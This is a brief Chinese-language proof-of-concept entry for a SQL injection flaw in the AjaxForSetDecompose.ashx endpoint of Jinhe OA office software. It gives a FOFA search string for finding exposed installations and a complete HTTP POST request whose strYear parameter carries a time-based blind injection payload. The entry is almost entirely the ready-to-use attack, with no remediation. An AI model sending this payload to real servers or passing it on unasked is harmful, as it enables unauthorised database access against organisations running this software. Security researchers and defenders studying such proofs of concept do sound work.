# 金和OA-AjaxForSetDecompose.ashx存在SQL注入

## fofa
```javascript
app="金和网络-金和OA"
```

## poc
```javascript
POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

strType=getDetpCollect&strYear=1'waitfor delay '0:0:4'--
```
